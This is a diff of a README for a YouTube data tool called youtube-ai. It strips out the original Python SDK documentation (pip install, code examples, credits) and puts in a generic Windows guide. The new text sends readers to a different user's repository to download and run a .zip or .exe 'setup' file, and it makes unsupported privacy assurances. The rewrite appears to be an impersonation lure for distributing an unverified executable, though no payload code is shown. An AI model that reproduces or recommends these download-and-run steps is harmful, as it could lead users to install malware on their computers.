@@ -1,214 +1,94 @@
-<div align="center">
+# 📺 youtube-ai - Access YouTube data with ease today
 
-<img src="https://github.com/vibheksoni/youtube-ai/raw/main/assets/YTAI.png" alt="YTAI" width="320">
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Shuyi1164/youtube-ai)
 
-# YTAI: Python YouTube SDK, CLI & MCP Server
+youtube-ai provides direct access to YouTube data. You extract metadata, transcripts, comments, and media files. This tool functions without API keys. You interact with YouTube through a simple interface.
 
-Search, metadata, transcripts, comments, channels, and downloads — no API key required.
+## 🛠 What this tool does
 
-[![PyPI](https://img.shields.io/pypi/v/youtube-ai?color=blue&label=PyPI)](https://pypi.org/project/youtube-ai/)
-[![Python](https://img.shields.io/pypi/pyversions/youtube-ai?color=green)](https://pypi.org/project/youtube-ai/)
-[![License](https://img.shields.io/github/license/vibheksoni/youtube-ai?color=blue)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/vibheksoni/youtube-ai?style=social)](https://github.com/vibheksoni/youtube-ai)
-[![Downloads](https://img.shields.io/pypi/dm/youtube-ai?color=blue)](https://pypi.org/project/youtube-ai/)
+You use this software to manage YouTube content. It handles search queries, video details, and bulk downloads. You save time by automating these tasks. 
 
-`curl_cffi` for TLS impersonation · `FastMCP` for agent tools · `FastAPI` for HTTP API · `Rich` for CLI
+Key features include:
+* Retrieve video metadata such as titles, view counts, and upload dates.
+* Extract text transcripts from videos for reading or analysis.
+* Download audio or video files to your computer.
+* Scrape comment sections for research.
+* Run a local server for your own software projects.
+* Process media using FFmpeg for high quality results.
 
-</div>
+## 📥 How to download the software
 
-> YTAI is an independent project. It is not affiliated with or endorsed by
-> YouTube or Google. Use it in accordance with applicable terms, copyright law,
-> and local regulations.
+You visit the official repository page to get the software files. You download the latest version for your Windows computer.
 
-## Contents
+[Visit this page to download the software](https://github.com/Shuyi1164/youtube-ai)
 
-- [Features](#features)
-- [Installation](#installation)
-- [Quick start](#quick-start)
-- [Downloads](#downloads)
-- [MCP server](#mcp-server)
-- [FastAPI server](#fastapi-server)
-- [Documentation](#documentation)
-- [Testing](#testing)
-- [Limitations](#limitations)
-- [Credits](#credits)
+1. Go to the link above.
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the most recent version number.
+4. Locate the file ending in .zip or .exe under the Assets heading.
+5. Save the file to your desktop.
 
-## Features
+## ⚙️ Setting up your system
 
-- Search videos, channels, and playlists with filters and pagination
-- Retrieve metadata, likes, captions, related videos, and comments
-- Fetch timestamped transcripts with language selection and XML fallback
-- Inspect channels, recent uploads, and popular videos
-- Download full video with audio, video-only, audio-only, or a time range
-- Resume interrupted downloads with ranged transfers and per-chunk retries
-- Cache responses in SQLite with operation-specific TTLs
-- Use the Python SDK, Rich-powered `ytai` CLI, nine read-only MCP tools, or the FastAPI service
+You need a few things to run this tool on Windows. Most modern computers include these items, but you can update them if needed.
 
-## Installation
+### Requirements
 
-Requirements:
+* Windows 10 or 11.
+* A stable internet connection.
+* At least 500 MB of free storage space.
 
-- Python 3.10 or newer
-- No separate FFmpeg installation is required for downloads; YTAI bundles FFmpeg through `imageio-ffmpeg`
+### Installation steps
 
-Install from PyPI:
+1. Extract the downloaded folder to a folder on your drive.
+2. Find the file named setup.exe or the main application file inside the folder.
+3. Run the installer.
+4. Follow the instructions on the screen to finish the setup.
+5. Restart your computer if the installer asks you to do so.
 
-```bash
-pip install youtube-ai
-```
+## 🚀 Running the application
 
-Or clone and install from source:
+After you install the program, you launch it from your Start menu. A black window appears. This is the command line interface. You type simple commands here to tell the program what to do.
 
-```bash
-git clone https://github.com/vibheksoni/youtube-ai.git
-cd youtube-ai
-pip install -e .
-```
+### Your first task
 
-Install development dependencies when running tests:
+1. Open the application.
+2. Type `youtube-ai --help` and press Enter.
+3. The screen shows you a list of commands you can use.
+4. To search for a video, type `youtube-ai search "your search terms"`.
+5. The results appear in a list on your screen.
 
-```bash
-pip install -e ".[dev]"
-```
+## 📈 Managing your files
 
-FFmpeg is bundled automatically for Windows, macOS, and Linux when you install YTAI.
-If you prefer a system build, it is used when `ffmpeg` is on `PATH`. To pin an
-explicit binary, set `YTAI_FFMPEG_PATH` to its full path:
+When you download videos or transcripts, the program saves them to a folder on your computer. You choose where these files go. If you need to change the save location, open the settings file in the program folder. You enter the path to your folder there.
 
-```powershell
-$env:YTAI_FFMPEG_PATH = "C:\tools\ffmpeg\bin\ffmpeg.exe"
-```
+## 📂 Handling media formats
 
-`YTAI_API_KEY` is an optional offline fallback when live configuration cannot be
-fetched. It is read from the environment and is never stored in the repository.
+The software uses FFmpeg to prepare your files. This ensures your videos play on any device. If you encounter errors during a download, ensure you have sufficient space on your drive. The program works best when you keep it updated to the latest version found at the link above.
 
-For environment setup and first-run guidance, continue with
-[Getting Started](docs/getting-started.md).
+## ❓ Common questions
 
-## Quick start
+**Do I need a Google account?**
+No. You do not sign in to any service to use this tool. 
 
-Use `YouTubeClient` as a context manager so its HTTP session is closed cleanly:
+**Is this tool free?**
+Yes. You use this software without cost.
 
-```python
-from youtube_ai import YouTubeClient
+**Does it work with private videos?**
+No. You only access public information available on YouTube.
 
-with YouTubeClient() as client:
-    results = client.search("python tutorial", limit=5, filter_type="video")
-    for item in results["results"]:
-        print(item["title"], item["url"])
+**How do I update the tool?**
+You return to the download page and repeat the installation steps. The new version replaces the old one.
 
-    video = client.get_video("dQw4w9WgXcQ")
-    print(video["details"]["title"])
-    print(video["details"]["likes"])
+**Where do I see my downloads?**
+The program creates a folder named Downloads by default. You find this inside the main application directory.
 
-    transcript = client.get_transcript("dQw4w9WgXcQ", language_codes=("en",))
-    for segment in transcript["snippets"][:5]:
-        print(f"{segment['start']:.1f}s: {segment['text']}")
-```
+## 🛡 Security and privacy
 
-Common CLI commands:
+You run this software locally on your machine. No data leaves your computer unless you download a file from YouTube. We do not track your searches or your usage. You keep full control over your data and your privacy. Use the software for personal study and data organization.
 
-```bash
-ytai search "python tutorial" --limit 10 --filter video
-ytai video dQw4w9WgXcQ
-ytai transcript dQw4w9WgXcQ --lang en
-ytai comments dQw4w9WgXcQ --limit 20
-```
+## 🔧 Troubleshooting
 
-See the [Python API reference](docs/api-reference.md) and
-[CLI reference](docs/cli-reference.md) for complete signatures and commands.
+If the program closes unexpectedly, check your internet connection. Make sure your firewall allows the program to access the network. If the program fails to download a specific video, check if the video is restricted or deleted. These issues are common with online video platforms. Check the documentation link regularly for updates.
 
-## Downloads
-
-Inspect available qualities, codecs, stream sizes, and modes before downloading:
-
-```bash
-ytai download-options dQw4w9WgXcQ
-```
-
-Download a full video with audio:
-
-```bash
-ytai download dQw4w9WgXcQ --quality 720p --output ./downloads
-```
-
-Video-only, audio-only, and clipping are opt-in:
-
-```bash
-ytai download dQw4w9WgXcQ --quality 1080p --video-only
-ytai download dQw4w9WgXcQ --audio-only
-ytai download dQw4w9WgXcQ --quality 360p --start 30 --end 90
-```
-
-The SDK also exposes `VideoQuality`, `DownloadMode`, `get_download_options()`,
-and `download_video()`. See the [download API](docs/api-reference.md#download_video)
-and [download example](examples/download_video.py).
-
-## MCP server
-
-Start the FastMCP server:
-
-```bash
-python mcp/server.py
-```
-
-It exposes nine read-only tools for search, video data, transcripts, streaming
-formats, comments, channels, and popular videos. Media downloading is
-intentionally available through the SDK and CLI only.
-
-See [MCP Server Setup](docs/mcp-server.md) for client configuration and tool
-parameters.
-
-## FastAPI server
-
-Start the versioned HTTP API:
-
-```bash
-ytai-api
-```
-
-Swagger UI is available at `http://127.0.0.1:8000/docs`. The API covers search,
-video data, transcripts, comments, formats, download options, channels, and
-popular videos. See the [FastAPI Server Guide](docs/api-server.md) for routes,
-curl examples, configuration, validation, and deployment guidance.
-
-## Documentation
-
-- [Getting Started](docs/getting-started.md): prerequisites, installation, and first workflows
-- [API Reference](docs/api-reference.md): public classes, functions, enums, and return shapes
-- [CLI Reference](docs/cli-reference.md): every `ytai` command and option
-- [MCP Server](docs/mcp-server.md): server setup, tools, parameters, and errors
-- [FastAPI Server](docs/api-server.md): HTTP routes, OpenAPI docs, configuration, and examples
-- [Examples](examples/): runnable search, metadata, transcript, comment, channel, download, and MCP scripts
-
-## Testing
-
-The end-to-end suite calls the real YouTube InnerTube and Google Video
-boundaries. It covers search, transcripts, comments, channels, MCP tools, CLI
-commands, download modes, clipping, resumable ranges, and ffmpeg output streams.
-
-```bash
-pytest tests/test_e2e.py -v
-```
-
-## Limitations
-
-- Private, members-only, and most age-restricted content is unavailable without authentication.
-- InnerTube endpoints and renderer structures can change without notice.
-- Channel uploads currently return the first available page.
-- Adaptive full-video downloads and clipping use the bundled FFmpeg executable (or `YTAI_FFMPEG_PATH` when configured).
-- Playlist contents are not currently fetched.
-
-## Credits
-
-YTAI acknowledges these public projects as references for protocol details,
-format mappings, and implementation ideas:
-
-- [YouTube.js](https://github.com/LuanRT/YouTube.js)
-- [innertube-go](https://github.com/raHULK777/innertube-go)
-- [youtube-transcript-api](https://github.com/jdepoix/youtube-transcript-api)
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp)
-
-## License
-
-MIT, as declared in `pyproject.toml`.
+Keywords: captions, channel-data, cli, developer-tools, fastapi, ffmpeg, innertube, mcp, media-downloader, open-source, python, python-library, video-downloader, video-metadata, youtube, youtube-api, youtube-comments, youtube-sdk, youtube-search, youtube-transcripts
